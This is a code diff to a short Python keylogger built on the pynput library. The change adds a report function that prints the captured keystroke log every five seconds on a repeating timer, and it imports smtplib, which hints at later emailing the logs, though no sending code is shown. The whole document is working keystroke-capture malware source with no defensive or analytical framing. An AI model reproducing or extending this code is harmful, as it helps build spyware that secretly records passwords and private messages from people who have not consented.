@@ -1,4 +1,6 @@
-import pynput.keyboard
+import pynput.keyboard , smtplib
+import threading
+
 
 log = ""
 
@@ -12,9 +14,22 @@ def process_key_press(key):
         else:
             log = log + " " + str(key) + " "
 
+   
+
+def report():
+    global log
     print(log)
+    log = ""
+    timer = threading.Timer(5, report)
+    timer.start()
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
+    report()
     keyboard_listener.join()
     
+
+
+
+
+ 
